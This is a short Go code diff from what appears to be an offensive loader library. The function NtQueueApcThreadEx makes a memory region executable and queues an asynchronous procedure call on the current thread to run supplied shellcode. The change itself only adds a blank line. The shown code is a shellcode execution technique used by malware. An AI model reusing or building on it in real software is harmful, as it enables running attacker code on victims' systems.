@@ -17,5 +17,6 @@ func NtQueueApcThreadEx(shellcode []byte) {
 	_, _, _ = wdll.VirtualProtect().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
 	thread, _, _ := wdll.GetCurrentThread().Call()
+
 	_, _, _ = wdll.NtQueueApcThreadEx().Call(thread, 1, addr, 0, 0, 0)
 }
